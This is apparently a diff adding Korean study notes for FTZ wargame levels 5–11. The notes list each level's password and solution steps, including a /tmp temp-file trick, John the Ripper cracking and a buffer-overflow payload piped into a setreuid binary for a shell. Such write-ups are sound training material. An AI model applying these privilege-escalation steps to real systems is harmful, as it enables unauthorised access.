@@ -248,3 +248,104 @@ int main(){
     system("my-pass");
 }
 ~~~
+
+>level5
+
+password : what is your name?
+
+hint : 
+/usr/bin/level5 프로그램은 /tmp 디렉토리에
+level5.tmp 라는 이름의 임시파일을 생성한다.
+
+이를 이용하여 level6의 권한을 얻어라.
+
+* 풀이
+    1. cd /tmp
+    2. cat > level5.tmp
+    3. /usr/bin/level5
+    4. cat level5.tmp
+
+>level6
+
+password : what the hell
+
+* 풀이
+    1. 힌트창에서 ctrl + c
+    2. cat password
+
+>level7
+
+password : come together
+
+hint : 
+
+/bin/level7 명령을 실행하면, 패스워드 입력을 요청한다.
+
+1. 패스워드는 가까운곳에..
+2. 상상력을 총동원하라.
+3. 2진수를 10진수를 바꿀 수 있는가?
+4. 계산기 설정을 공학용으로 바꾸어라.
+
+* 풀이
+    1. --_--_- --____- ---_-__ --__-_-
+    2. 1101101 -> 109 -> m
+    3. 1100001 -> 97 -> a
+    4. 1110100 -> 116 -> t
+    5. 1100101 -> 101 -> e
+
+>level8 (pass)
+
+password : break the world
+
+* 풀이
+    1. 존더리퍼 쓰고 패스워드 크랙
+
+>level9
+
+password : apple
+
+hint :
+~~~ c
+// 다음은 /usr/bin/bof의 소스이다.
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+ 
+main(){
+ 
+  char buf2[10];
+  char buf[10];
+ 
+  printf("It can be overflow : ");
+  fgets(buf,40,stdin);
+ 
+  if ( strncmp(buf2, "go", 2) == 0 )
+   {
+        printf("Good Skill!\n");
+        setreuid( 3010, 3010 );
+        system("/bin/bash");
+   }
+ 
+}   
+
+// 이를 이용하여 level10의 권한을 얻어라.
+~~~
+
+* 풀이
+    1. cp ./hint tmp/level9.c
+    2. vi tmp/level9.c
+    3. gcc -o tmp/level9 tmp/level9.c
+    4. gdb -q tmp/level9
+    5. (gdb) set disas intel
+    6. (gdb) disas main 
+    7. (python -c 'print "A"*16+"go"';cat)|/usr/bin/bof
+    8. my-pass
+
+>level10 (pass)
+
+password : interesting to hack!
+
+>level11
+
+password : what!@#$?
